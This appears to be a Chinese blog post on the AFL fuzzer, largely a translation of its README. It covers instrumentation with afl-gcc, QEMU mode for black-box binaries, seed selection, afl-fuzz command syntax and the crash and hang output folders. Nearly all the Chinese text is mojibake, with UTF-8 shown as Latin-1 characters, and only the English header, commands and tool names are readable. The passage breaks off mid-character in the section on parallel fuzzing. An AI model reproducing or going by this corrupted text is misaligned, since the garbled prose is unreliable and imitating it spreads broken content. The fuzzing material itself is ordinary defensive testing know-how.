åœ¨Linuxä¸Šï¼Œå¯é€‰çš„QEMUæ¨¡å¼ä¹Ÿå…è®¸å¯¹é»‘ç›’äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ AFLçš„å˜ä½“å’Œè¡ç”Ÿç‰©å…è®¸æ‚¨æ¨¡ç³ŠPythonï¼ŒGoï¼ŒRustï¼ŒOCamlï¼ŒGCJ Javaï¼Œå†…æ ¸ç³»ç»Ÿè°ƒç”¨ï¼Œç”šè‡³æ•´ä¸ªè™šæ‹Ÿæœºã€‚ è¿˜æœ‰ä¸€ä¸ªå¯†åˆ‡å¯å‘çš„è¿›ç¨‹æ¨¡ç³Šå™¨ï¼Œå®ƒåœ¨LLVMä¸­è¿è¡Œï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªåœ¨Windowsä¸Šè¿è¡Œçš„åˆ†æ”¯ã€‚ æœ€åï¼ŒAFLæ˜¯OSS-FuzzèƒŒåçš„æ¨¡ç³Šå¼•æ“ä¹‹ä¸€ã€‚ å“¦ - å¦‚æœä½ å®‰è£…äº†gnuplotï¼Œä½ å¯ä»¥ä½¿ç”¨afl-plotæ¥è·å¾—æ¼‚äº®çš„è¿›åº¦å›¾ã€‚ 0x03 AFLç‰¹ç‚¹ éå¸¸å¤æ‚ã€‚å®ƒæ˜¯ä¸€ç§æ’æ¡©å™¨ï¼ˆinstrumentationï¼‰å¼•å¯¼çš„é—ä¼ æ¨¡ç³Šå™¨ï¼Œèƒ½å¤Ÿåœ¨å„ç§éå¹³å‡¡çš„ç›®æ ‡ä¸­åˆæˆå¤æ‚çš„æ–‡ä»¶è¯­ä¹‰ï¼Œå‡å°‘äº†å¯¹ä¸“ç”¨çš„è¯­æ³•è¯†åˆ«å·¥å…·çš„éœ€æ±‚ã€‚å®ƒè¿˜å¸¦æœ‰ä¸€ä¸ªç‹¬ç‰¹çš„å´©æºƒæµè§ˆå™¨ï¼Œä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹æœ€å°åŒ–å™¨ï¼Œä¸€ä¸ªæ•…éšœè§¦å‘åˆ†é…å™¨å’Œä¸€ä¸ªè¯­æ³•åˆ†æå™¨ - ä½¿è¯„ä¼°å´©æºƒé”™è¯¯çš„å½±å“å˜å¾—ç®€å•ã€‚ æ™ºèƒ½ã€‚å®ƒå›´ç»•ä¸€ç³»åˆ—ç»è¿‡ç²¾å¿ƒç ”ç©¶ï¼Œé«˜å¢ç›Šçš„æµ‹è¯•ç”¨ä¾‹é¢„å¤„ç†å’Œæ¨¡ç³Šæµ‹è¯•ç­–ç•¥è€Œæ„å»ºï¼Œåœ¨å…¶ä»–æ¨¡ç³Šæµ‹è¯•æ¡†æ¶ä¸­å¾ˆå°‘é‡‡ç”¨ä¸ä¹‹ç›¸å½“çš„ä¸¥æ ¼æ€§ã€‚ç»“æœï¼Œå®ƒå‘ç°äº†çœŸæ­£çš„æ¼æ´ã€‚ å®ƒå¾ˆå¿«ã€‚ç”±äºå…¶ä½çº§ç¼–è¯‘æ—¶é—´æˆ–ä»…äºŒè¿›åˆ¶æ£€æµ‹å’Œå…¶ä»–ä¼˜åŒ–ï¼Œè¯¥å·¥å…·æä¾›äº†é’ˆå¯¹å¸¸è§ç°å®ä¸–ç•Œç›®æ ‡çš„è¿‘åŸç”Ÿæˆ–ä¼˜äºåŸç”Ÿçš„æ¨¡ç³Šæµ‹è¯•é€Ÿåº¦ã€‚æ–°å¢çš„æŒä¹…æ¨¡å¼å…è®¸åœ¨æœ€å°‘çš„ä»£ç ä¿®æ”¹çš„å¸®åŠ©ä¸‹ï¼Œå¯¹è®¸å¤šç¨‹åºè¿›è¡Œå¼‚å¸¸å¿«é€Ÿçš„æ¨¡ç³Šæµ‹è¯•ã€‚ å¯ä»¥é“¾æ¥åˆ°å…¶ä»–å·¥å…·ã€‚æ¨¡ç³Šå™¨å¯ä»¥ç”Ÿæˆä¼˜è´¨ï¼Œç´§å‡‘çš„æµ‹è¯•è¯­æ–™åº“ï¼Œå¯ä»¥ä½œä¸ºæ›´ä¸“ä¸šï¼Œæ›´æ…¢æˆ–åŠ³åŠ¨å¯†é›†å‹æµç¨‹å’Œæµ‹è¯•æ¡†æ¶çš„ç§å­ã€‚å®ƒè¿˜èƒ½å¤Ÿä¸ä»»ä½•å…¶ä»–è½¯ä»¶è¿›è¡Œå³æ—¶è¯­æ–™åº“åŒæ­¥ã€‚ 0x04 AFL README Written and maintained by Michal Zalewski &#x6c;&#99;&#x61;&#109;&#116;&#x75;&#x66;&#x40;&#x67;&#x6f;&#x6f;&#103;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d; Copyright 2013, 2014, 2015, 2016 Google Inc. All rights reserved. Released under terms and conditions of Apache License, Version 2.0. For new versions and additional information, check out: http://lcamtuf.coredump.cx/afl/ To compare notes with other users or get notified about major new features, send a mail to &#97;&#x66;&#108;&#x2d;&#x75;&#x73;&#101;&#114;&#x73;&#43;&#x73;&#117;&#98;&#115;&#99;&#114;&#105;&#98;&#x65;&#64;&#x67;&#x6f;&#111;&#103;&#108;&#x65;&#x67;&#114;&#x6f;&#x75;&#112;&#115;&#x2e;&#x63;&#x6f;&#x6d;. See QuickStartGuide.txt if you donâ€™t have time to read this file. 1ï¼‰å…·æœ‰å¯¼å‘æ€§çš„æ¨¡ç³Šæµ‹è¯•çš„æŒ‘æˆ˜Fuzzingæ˜¯ç”¨äºè¯†åˆ«çœŸå®è½¯ä»¶ä¸­çš„å®‰å…¨é—®é¢˜çš„æœ€å¼ºå¤§ä¸”ç»è¿‡éªŒè¯çš„ç­–ç•¥ä¹‹ä¸€;å®ƒè´Ÿè´£å®‰å…¨å…³é”®è½¯ä»¶ä¸­è¿„ä»Šä¸ºæ­¢å‘ç°çš„ç»å¤§å¤šæ•°è¿œç¨‹ä»£ç æ‰§è¡Œå’Œæƒé™æå‡æ¼æ´ã€‚ä¸å¹¸çš„æ˜¯ï¼Œæ¨¡ç³Šæµ‹è¯•ä¹Ÿä¸å¤Ÿæœ‰åŠ›ã€‚ç›²ç›®çš„ã€éšæœºçš„å˜å¼‚ä½¿å¾—å®ƒä¸å¤ªå¯èƒ½åœ¨æµ‹è¯•ä»£ç ä¸­è¾¾åˆ°æŸäº›ä»£ç è·¯å¾„ï¼Œä»è€Œä½¿ä¸€äº›æ¼æ´è¶…å‡ºäº†è¿™ç§æŠ€æœ¯çš„èŒƒå›´ã€‚å·²ç»æœ‰è®¸å¤šå°è¯•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æ—©æœŸæ–¹æ³•ä¹‹ä¸€ - ç”±Tavis Ormandyå¼€åˆ› - æ˜¯ä¸€ç§ è¯­ä¹‰åº“è’¸é¦ï¼ˆcorpus distillationï¼‰ ã€‚ç½‘ä¸Šæ‰¾åˆ°çš„ä¸€äº›å¤§å‹è¯­æ–™åº“ä¸­å¾€å¾€åŒ…å«å¤§é‡çš„æ–‡ä»¶ï¼Œè¿™æ—¶å°±éœ€è¦å¯¹å…¶ç²¾ç®€ï¼Œè¯¥æ–¹æ³•ä¾èµ–äºè¦†ç›–ä¿¡å·ä»å¤§é‡é«˜è´¨é‡çš„å€™é€‰æ–‡ä»¶è¯­æ–™åº“ä¸­é€‰æ‹©æœ‰è¶£ç§å­çš„å­é›†ï¼Œç„¶åé€šè¿‡ä¼ ç»Ÿæ–¹å¼å¯¹å…¶è¿›è¡Œæ¨¡ç³Šå¤„ç†ã€‚è¯¥æ–¹æ³•éå¸¸æœ‰æ•ˆï¼Œä½†éœ€è¦è¿™æ ·çš„è¯­æ–™åº“éšæ—¶å¯ç”¨ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œä»£ç è¦†ç›–ç‡ ä¹Ÿåªæ˜¯è¡¡é‡ç¨‹åºæ‰§è¡ŒçŠ¶æ€çš„ä¸€ä¸ªç®€å•åŒ–çš„åº¦é‡ï¼Œè¿™ç§æ–¹å¼å¹¶ä¸é€‚åˆåç»­å¼•å¯¼fuzzingæµ‹è¯•çš„ã€‚å…¶ä»–æ›´å¤æ‚çš„ç ”ç©¶é›†ä¸­åœ¨è¯¸å¦‚ ç¨‹åºæµåˆ†æï¼ˆâ€œconcoic executionâ€ï¼‰ï¼Œç¬¦å·æ‰§è¡Œæˆ–é™æ€åˆ†æ ç­‰æŠ€æœ¯ä¸Šã€‚æ‰€æœ‰è¿™äº›æ–¹æ³•åœ¨å®éªŒç¯å¢ƒä¸­éƒ½éå¸¸æœ‰å‰æ™¯ï¼Œä½†åœ¨å®é™…åº”ç”¨ä¸­å¾€å¾€ä¼šé‡åˆ°å¯é æ€§å’Œæ€§èƒ½é—®é¢˜ - éƒ¨åˆ†é«˜ä»·å€¼çš„ç¨‹åºéƒ½æœ‰éå¸¸å¤æ‚çš„å†…éƒ¨çŠ¶æ€å’Œæ‰§è¡Œè·¯å¾„ï¼Œåœ¨è¿™ä¸€æ–¹é¢ç¬¦å·æ‰§è¡Œå’ŒconcolicæŠ€æœ¯å¾€å¾€ä¼šæ˜¾å¾—ä¸å¤Ÿå¥å£®ï¼ˆå¦‚è·¯å¾„çˆ†ç‚¸é—®é¢˜ï¼‰ï¼Œæ‰€ä»¥ä»ç„¶ç¨é€Šäºä¼ ç»Ÿçš„fuzzingæŠ€æœ¯ã€‚ 2ï¼‰afl-fuzzæ–¹æ³•American Fuzzy Lopæ˜¯ä¸€ç§æš´åŠ›æ¨¡ç³Šæµ‹è¯•ï¼Œé…æœ‰æå…¶ç®€å•ä½†åšå¦‚ç£çŸ³çš„ å¼•å¯¼é—ä¼ ç®—æ³• ã€‚å®ƒä½¿ç”¨ä¿®æ”¹åçš„è¾¹è¦†ç›–ç‡ï¼Œè½»æ¾åœ°è·å–ç¨‹åºæ§åˆ¶æµç¨‹çš„ç»†å¾®å±€éƒ¨å˜åŒ–ã€‚ç®€åŒ–ä¸€ä¸‹ï¼Œæ•´ä½“ç®—æ³•å¯ä»¥æ¦‚æ‹¬ä¸ºï¼š 1ï¼‰å°†ç”¨æˆ·æä¾›çš„åˆå§‹æµ‹è¯•ç”¨ä¾‹åŠ è½½åˆ°é˜Ÿåˆ—ä¸­ï¼Œ 2ï¼‰ä»é˜Ÿåˆ—ä¸­è·å–ä¸‹ä¸€ä¸ªè¾“å…¥æ–‡ä»¶ï¼Œ 3ï¼‰å°è¯•å°†æµ‹è¯•ç”¨ä¾‹ä¿®å‰ªåˆ°ä¸ä¼šæ”¹å˜ç¨‹åºæµ‹é‡è¡Œä¸ºçš„æœ€å°å°ºå¯¸ï¼Œ 4ï¼‰ä½¿ç”¨å¹³è¡¡ä¸”ç»è¿‡å……åˆ†ç ”ç©¶çš„å„ç§ä¼ ç»Ÿæ¨¡ç³Šæµ‹è¯•ç­–ç•¥åå¤æ”¹å˜æ–‡ä»¶ï¼Œ 5ï¼‰å¦‚æœä»»ä½•ç”Ÿæˆçš„ç¼–è¯‘å¯¼è‡´ç”±instrumentationè®°å½•çš„æ–°çŠ¶æ€è½¬æ¢ï¼Œåˆ™å°†å˜å¼‚è¾“å‡ºæ·»åŠ ä¸ºé˜Ÿåˆ—ä¸­çš„æ–°æ¡ç›®ã€‚ 6ï¼‰è½¬åˆ°2ã€‚ å‘ç°çš„æµ‹è¯•ç”¨ä¾‹ä¹Ÿä¼šå®šæœŸè¢«æ·˜æ±°ï¼Œä»¥æ¶ˆé™¤é‚£äº›è¢«æ›´æ–°ï¼Œæ›´é«˜è¦†ç›–ç‡çš„å‘ç°æ‰€æ·˜æ±°çš„æµ‹è¯•ç”¨ä¾‹ã€‚å¹¶ç»å†å…¶ä»–å‡ ä¸ªæ’æ¡©é©±åŠ¨ï¼ˆinstrumentation-drivenï¼‰çš„åŠªåŠ›æœ€å°åŒ–æ­¥éª¤ã€‚ä½œä¸ºæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹çš„ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œè¯¥å·¥å…·åˆ›å»ºäº†ä¸€ä¸ªå°å‹ï¼Œç‹¬ç«‹çš„æœ‰è¶£æµ‹è¯•ç”¨ä¾‹é›†ã€‚è¿™äº›å¯¹äºæ’­ç§å…¶ä»–åŠ³åŠ¨åŠ›æˆ–èµ„æºå¯†é›†å‹æµ‹è¯•æ–¹æ¡ˆéå¸¸æœ‰ç”¨ - ä¾‹å¦‚ï¼Œç”¨äºå‹åŠ›æµ‹è¯•æµè§ˆå™¨ï¼ŒåŠå…¬åº”ç”¨ç¨‹åºï¼Œå›¾å½¢å¥—ä»¶æˆ–é—­æºå·¥å…·ã€‚è¯¥æ¨¡ç³Šå™¨ç»è¿‡å…¨é¢æµ‹è¯•ï¼Œå¯æä¾›è¿œè¿œä¼˜äºç›²ç›®æ¨¡ç³Šæˆ–ä»…è¦†ç›–å·¥å…·çš„å¼€ç®±å³ç”¨æ€§èƒ½ã€‚ 3ï¼‰ç”¨äºAFLçš„æ’æ¡©ï¼ˆinstrumentationï¼‰ç¨‹åºå½“æºä»£ç å¯ç”¨æ—¶ï¼Œå¯ä»¥é€šè¿‡é…å¥—å·¥å…· æ³¨å…¥instrumentation ï¼Œè¯¥å·¥å…·å¯ä½œä¸ºç¬¬ä¸‰æ–¹ä»£ç çš„ä»»ä½•æ ‡å‡†æ„å»ºè¿‡ç¨‹ä¸­gccæˆ–clangçš„æ›¿ä»£å“ã€‚instrumentationå…·æœ‰ç›¸å½“é€‚åº¦çš„æ€§èƒ½å½±å“;ä¸afl-fuzzå®ç°çš„å…¶ä»–ä¼˜åŒ–ç›¸ç»“åˆï¼Œå¤§å¤šæ•°ç¨‹åºå¯ä»¥åƒä¼ ç»Ÿå·¥å…·ä¸€æ ·å¿«é€Ÿæˆ–ç”šè‡³æ›´å¿«åœ°è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ é‡æ–°ç¼–è¯‘ç›®æ ‡ç¨‹åº çš„æ­£ç¡®æ–¹æ³•å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œå…·ä½“å–å†³äºæ„å»ºè¿‡ç¨‹çš„å…·ä½“æƒ…å†µï¼Œä½†å‡ ä¹é€šç”¨çš„æ–¹æ³•æ˜¯ï¼š123$ CC = /path/to/afl/afl-gcc ./configure$ make clean allå¯¹äºC ++ç¨‹åºï¼Œæ‚¨è¿˜éœ€è¦å°†CXX = / path /è®¾ç½®ä¸º/ afl / afl g ++ã€‚ clangç»„ä»¶ï¼ˆafl-clangå’Œafl-clang ++ï¼‰å¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼ä½¿ç”¨; clangç”¨æˆ·ä¹Ÿå¯ä»¥é€‰æ‹©åˆ©ç”¨æ›´é«˜æ€§èƒ½çš„æ£€æµ‹æ¨¡å¼ï¼Œå¦‚llvm_mode / README.llvmä¸­æ‰€è¿°ã€‚ åœ¨æµ‹è¯•åº“æ—¶ï¼Œæ‚¨éœ€è¦æŸ¥æ‰¾æˆ–ç¼–å†™ä¸€ä¸ªç®€å•çš„ç¨‹åºï¼Œè¯¥ç¨‹åºä»stdinæˆ–æ–‡ä»¶ä¸­è¯»å–æ•°æ®å¹¶å°†å…¶ä¼ é€’ç»™æµ‹è¯•çš„åº“ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¿…é¡» å°†æ­¤å¯æ‰§è¡Œæ–‡ä»¶ä¸å·²æ£€æµ‹åº“çš„é™æ€ç‰ˆæœ¬ç›¸é“¾æ¥ ï¼Œæˆ–è€…ç¡®ä¿åœ¨è¿è¡Œæ—¶åŠ è½½æ­£ç¡®çš„.soæ–‡ä»¶ï¼ˆé€šå¸¸é€šè¿‡è®¾ç½®LD_LIBRARY_PATHï¼‰ã€‚æœ€ç®€å•çš„é€‰é¡¹æ˜¯ é™æ€æ„å»º ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š1$ CC = /path/to/afl/afl-gcc ./configure --disable-shared è°ƒç”¨makeæ—¶è®¾ç½®AFL_HARDEN = 1å°†å¯¼è‡´CCç»„ä»¶è‡ªåŠ¨å¯ç”¨ä»£ç å¼ºåŒ–é€‰é¡¹ï¼Œä»¥ä¾¿æ›´å®¹æ˜“æ£€æµ‹åˆ°ç®€å•çš„å†…å­˜é”™è¯¯ã€‚ Libdislocatorï¼ŒAFLé™„å¸¦çš„å¸®åŠ©ç¨‹åºåº“ï¼ˆè¯·å‚é˜…libdislocator / README.dislocatorï¼‰ä¹Ÿå¯ä»¥å¸®åŠ©å‘ç°å †æŸåé—®é¢˜ã€‚PSã€‚å»ºè®®ASANç”¨æˆ·æŸ¥çœ‹notes_for_asan.txtæ–‡ä»¶ä»¥è·å–é‡è¦è­¦å‘Šã€‚ 4ï¼‰æ£€æµ‹ä»…äºŒè¿›åˆ¶åº”ç”¨ç¨‹åºå½“æºä»£ç ä¸ºä¸å¯å¾—æ—¶ï¼Œaflä¸ºé»‘ç›’äºŒè¿›åˆ¶æ–‡ä»¶çš„å¿«é€Ÿã€å³æ—¶æ£€æµ‹æä¾›å®éªŒæ”¯æŒã€‚ è¿™æ˜¯é€šè¿‡åœ¨è¾ƒä¸ä¸ºäººçŸ¥çš„â€œç”¨æˆ·ç©ºé—´ä»¿çœŸâ€æ¨¡å¼ä¸‹è¿è¡Œçš„QEMUç‰ˆæœ¬æ¥å®ç°çš„ã€‚QEMUæ˜¯ä¸€ä¸ªç‹¬ç«‹äºAFLçš„é¡¹ç›®ï¼Œä½†æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ–¹ä¾¿åœ°æ„å»ºè¯¥åŠŸèƒ½ï¼š12$ cd qemu_mode$ ./build_qemu_support.sh æœ‰å…³å…¶ä»–è¯´æ˜å’Œæ³¨æ„äº‹é¡¹ï¼Œè¯·å‚é˜…qemu_mode / README.qemuã€‚è¯¥æ¨¡å¼æ¯”ç¼–è¯‘æ—¶æ’æ¡©ï¼ˆinstrumentationï¼‰æ…¢çº¦2-5å€ï¼Œå¯¹å¹¶è¡ŒåŒ–çš„å…¼å®¹è¾ƒå·®ï¼Œå¹¶ä¸”å¯èƒ½æœ‰ä¸€äº›å…¶ä»–çš„ä¸åŒã€‚ 5ï¼‰é€‰æ‹©åˆå§‹æµ‹è¯•ç”¨ä¾‹ä¸ºäº†æ­£ç¡®æ“ä½œï¼Œæ¨¡ç³Šå™¨éœ€è¦ä¸€ä¸ªæˆ–å¤šä¸ªèµ·å§‹æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ç›®æ ‡åº”ç”¨ç¨‹åºé€šå¸¸æ‰€éœ€çš„è¾“å…¥æ•°æ®çš„è‰¯å¥½ç¤ºä¾‹ã€‚ æœ‰ä¸¤ä¸ªåŸºæœ¬è§„åˆ™ï¼š æµ‹è¯•ç”¨ä¾‹è¶³å¤Ÿå°ã€‚ 1 kBä»¥ä¸‹æ˜¯ç†æƒ³çš„ï¼Œå°½ç®¡ä¸æ˜¯ç»å¯¹å¿…è¦çš„ã€‚ æœ‰å…³å¤§å°é‡è¦æ€§çš„è®¨è®ºï¼Œè¯·å‚é˜…perf_tips.txtã€‚ åªæœ‰åœ¨åŠŸèƒ½ä¸Šå½¼æ­¤ä¸åŒæ—¶æ‰ä½¿ç”¨å¤šä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚ ä½¿ç”¨äº”åå¼ ä¸åŒçš„åº¦å‡ç…§ç‰‡æ¥æ¨¡ç³Šå›¾åƒåº“æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚æ‚¨å¯ä»¥åœ¨æ­¤å·¥å…·é™„å¸¦çš„testcases/å­ç›®å½•ä¸­æ‰¾åˆ°è®¸å¤šå¯åŠ¨æ–‡ä»¶çš„å¥½ä¾‹å­ã€‚PSã€‚ å¦‚æœæœ‰å¤§é‡æ•°æ®å¯ç”¨äºç­›é€‰ï¼Œæ‚¨å¯èƒ½å¸Œæœ›ä½¿ç”¨afl-cminå®ç”¨ç¨‹åºæ¥è¯†åˆ«åœ¨ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ä½¿ç”¨ä¸åŒä»£ç è·¯å¾„çš„åŠŸèƒ½ä¸åŒçš„æ–‡ä»¶çš„å­é›†ã€‚ 6ï¼‰æ¨¡ç³Šæµ‹è¯•äºŒè¿›åˆ¶æ–‡ä»¶æµ‹è¯•è¿‡ç¨‹æœ¬èº«ç”±afl-fuzzå®ç”¨ç¨‹åºæ‰§è¡Œã€‚è¯¥ç¨‹åºéœ€è¦ä¸€ä¸ªå¸¦æœ‰åˆå§‹æµ‹è¯•ç”¨ä¾‹çš„åªè¯»ç›®å½•ï¼Œä¸€ä¸ªå­˜å‚¨å…¶è¾“å‡ºç»“æœçš„ç‹¬ç«‹ä½ç½®ï¼Œä»¥åŠè¦æµ‹è¯•çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ã€‚å¯¹äºç›´æ¥ä» stdin æ¥å—è¾“å…¥çš„ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€šå¸¸çš„è¯­æ³•æ˜¯ï¼š1$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [... params ...] å¯¹äºä» æ–‡ä»¶ ä¸­è·å–è¾“å…¥çš„ç¨‹åºï¼Œä½¿ç”¨â€œ@@â€æ ‡è®°ç›®æ ‡å‘½ä»¤è¡Œä¸­åº”æ”¾ç½®è¾“å…¥æ–‡ä»¶åçš„ä½ç½®ã€‚æ¨¡ç³Šå™¨å°†æ›¿æ¢ä¸ºæ‚¨ï¼š1$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ æ‚¨è¿˜å¯ä»¥ä½¿ç”¨-fé€‰é¡¹å°†å˜å¼‚æ•°æ®å†™å…¥ç‰¹å®šæ–‡ä»¶ã€‚å¦‚æœç¨‹åºéœ€è¦ç‰¹å®šçš„æ–‡ä»¶æ‰©å±•åï¼Œé‚£ä¹ˆè¿™å¾ˆæœ‰ç”¨ã€‚éæ’æ¡©äºŒè¿›åˆ¶æ–‡ä»¶å¯ä»¥åœ¨QEMUæ¨¡å¼ä¸‹ï¼ˆåœ¨å‘½ä»¤è¡Œä¸­æ·»åŠ -Qï¼‰æˆ–åœ¨ä¼ ç»Ÿçš„ç›²ç›®æ¨¡ç³Šæ¨¡å¼ï¼ˆæŒ‡å®š-nï¼‰ä¸­è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨-tå’Œ-mè¦†ç›–å·²æ‰§è¡Œè¿›ç¨‹çš„é»˜è®¤è¶…æ—¶å’Œå†…å­˜é™åˆ¶;perf_tips.txtä¸­è®¨è®ºäº†ä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•æ€§èƒ½çš„æŠ€å·§ã€‚ è¯·æ³¨æ„ï¼Œafl-fuzzé¦–å…ˆæ‰§è¡Œä¸€ç³»åˆ—ç¡®å®šæ€§æ¨¡ç³Šæµ‹è¯•æ­¥éª¤ï¼Œè¿™å¯èƒ½éœ€è¦å‡ å¤©æ—¶é—´ï¼Œä½†å¾€å¾€ä¼šäº§ç”Ÿæ•´é½çš„æµ‹è¯•ç”¨ä¾‹ã€‚å¦‚æœä½ æƒ³è¦å¿«é€Ÿç»“æœ - ç±»ä¼¼äºzzufå’Œå…¶ä»–ä¼ ç»Ÿçš„æ¨¡ç³Šå™¨ - åœ¨å‘½ä»¤è¡Œä¸­æ·»åŠ -dé€‰é¡¹ã€‚ 7ï¼‰è§£é‡Šè¾“å‡ºæœ‰å…³å¦‚ä½•è§£é‡Šæ˜¾ç¤ºçš„ç»Ÿè®¡ä¿¡æ¯ä»¥åŠç›‘è§†è¿›ç¨‹è¿è¡ŒçŠ¶å†µçš„ä¿¡æ¯ï¼Œè¯·å‚é˜…status_screen.txtæ–‡ä»¶ã€‚è¯·åŠ¡å¿…æŸ¥é˜…æ­¤æ–‡ä»¶ï¼Œå°¤å…¶æ˜¯å¦‚æœä»»ä½•UIå…ƒç´ ä»¥çº¢è‰²çªå‡ºæ˜¾ç¤ºã€‚æ¨¡ç³Šè¿‡ç¨‹å°†æŒç»­åˆ°æŒ‰Ctrl-Cä¸ºæ­¢ã€‚è‡³å°‘ï¼Œæ‚¨å¸Œæœ›å…è®¸æ¨¡ç³Šå™¨å®Œæˆä¸€ä¸ªé˜Ÿåˆ—å‘¨æœŸï¼Œè¿™å¯èƒ½éœ€è¦å‡ ä¸ªå°æ—¶åˆ°ä¸€å‘¨å·¦å³çš„æ—¶é—´ã€‚åœ¨è¾“å‡ºç›®å½•ä¸­åˆ›å»ºäº†ä¸‰ä¸ªå­ç›®å½•å¹¶å®æ—¶æ›´æ–°ï¼š é˜Ÿåˆ—queue/ - æµ‹è¯•æ¯ä¸ªç‹¬ç‰¹æ‰§è¡Œè·¯å¾„çš„æ¡ˆä¾‹ï¼Œä»¥åŠç”¨æˆ·æä¾›çš„æ‰€æœ‰èµ·å§‹æ–‡ä»¶ã€‚è¿™æ˜¯ç¬¬2èŠ‚ä¸­æåˆ°çš„åˆæˆè¯­æ–™åº“ã€‚åœ¨å°†æ­¤è¯­æ–™åº“ç”¨äºä»»ä½•å…¶ä»–ç›®çš„ä¹‹å‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨afl-cminå·¥å…·å°†å…¶ç¼©å°åˆ°è¾ƒå°çš„å¤§å°ã€‚è¯¥å·¥å…·å°†æ‰¾åˆ°ä¸€ä¸ªè¾ƒå°çš„æ–‡ä»¶å­é›†ï¼Œæä¾›ç›¸åŒçš„è¾¹ç¼˜è¦†ç›–ã€‚ å´©æºƒcrash/ - å¯¼è‡´è¢«æµ‹ç¨‹åºæ¥æ”¶è‡´å‘½ä¿¡å·çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ï¼ˆä¾‹å¦‚ï¼ŒSIGSEGVï¼ŒSIGILLï¼ŒSIGABRTï¼‰ã€‚æ¡ç›®æŒ‰æ¥æ”¶ä¿¡å·åˆ†ç»„ã€‚ æŒ‚èµ·hang/ - å¯¼è‡´æµ‹è¯•ç¨‹åºè¶…æ—¶çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚å°†æŸäº›å†…å®¹å½’ç±»ä¸ºæŒ‚èµ·ä¹‹å‰çš„é»˜è®¤æ—¶é—´é™åˆ¶æ˜¯1ç§’å†…çš„è¾ƒå¤§å€¼å’Œ-tå‚æ•°çš„å€¼ã€‚å¯ä»¥é€šè¿‡è®¾ç½®AFL_HANG_TMOUTæ¥å¾®è°ƒè¯¥å€¼ï¼Œä½†è¿™å¾ˆå°‘æ˜¯å¿…éœ€çš„ã€‚å´©æºƒå’ŒæŒ‚èµ·è¢«è§†ä¸ºâ€œå”¯ä¸€â€ â€œå¦‚æœç›¸å…³çš„æ‰§è¡Œè·¯å¾„æ¶‰åŠåœ¨å…ˆå‰è®°å½•çš„æ•…éšœä¸­æœªè§çš„ä»»ä½•çŠ¶æ€è½¬æ¢ã€‚å¦‚æœå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¾¾åˆ°å•ä¸ªé”™è¯¯ï¼Œé‚£ä¹ˆåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šæœ‰ä¸€äº›è®¡æ•°é€šè´§è†¨èƒ€ï¼Œä½†è¿™åº”è¯¥ä¼šè¿…é€Ÿé€æ¸å‡å°‘ã€‚ å´©æºƒå’ŒæŒ‚èµ·çš„æ–‡ä»¶åä¸çˆ¶ã€éé”™è¯¯çš„é˜Ÿåˆ—æ¡ç›®ç›¸å…³è”ã€‚è¿™åº”è¯¥æœ‰åŠ©äºè°ƒè¯•ã€‚å¦‚æœæ— æ³•é‡ç° afl-fuzz å‘ç°çš„å´©æºƒï¼Œæœ€å¯èƒ½çš„åŸå› æ˜¯æ‚¨æ²¡æœ‰è®¾ç½®ä¸å·¥å…·ä½¿ç”¨çš„å†…å­˜é™åˆ¶ç›¸åŒçš„å†…å­˜é™åˆ¶ã€‚å°è¯•ï¼š12$ LIMIT_MB = 50$ï¼ˆulimit -Sv $ [LIMIT_MB &lt;&lt; 10]; /path/to/tested_binary ...ï¼‰ æ›´æ”¹LIMIT_MBä»¥åŒ¹é…ä¼ é€’ç»™afl-fuzzçš„-må‚æ•°ã€‚åœ¨OpenBSDä¸Šï¼Œä¹Ÿå°†-Svæ›´æ”¹ä¸º-Sdã€‚ä»»ä½•ç°æœ‰çš„è¾“å‡ºç›®å½•ä¹Ÿå¯ç”¨äºæ¢å¤ä¸­æ­¢çš„ä½œä¸š;å°è¯•ï¼š$ ./afl-fuzz -i-o_ existing_output_dir [...etc...]å¦‚æœå®‰è£…äº†gnuplotï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨afl-plotä¸ºä»»ä½•æ´»åŠ¨çš„æ¨¡ç³Šæµ‹è¯•ä»»åŠ¡ç”Ÿæˆä¸€äº›æ¼‚äº®çš„å›¾å½¢ã€‚æœ‰å…³å¦‚ä½•æ˜¾ç¤ºçš„ç¤ºä¾‹ï¼Œè¯·å‚é˜… http://lcamtâ€‹â€‹uf.coredump.cx/afl/plot/ ã€‚ 8ï¼‰å¹¶è¡Œæ¨¡ç³Šæµ‹è¯•æ¯ä¸ªafl-fuzzçš„å®ä¾‹å¤§çº¦å ç”¨ä¸€ä¸ªæ ¸ã€‚ è¿™æ„å‘³ç€åœ¨å¤šæ 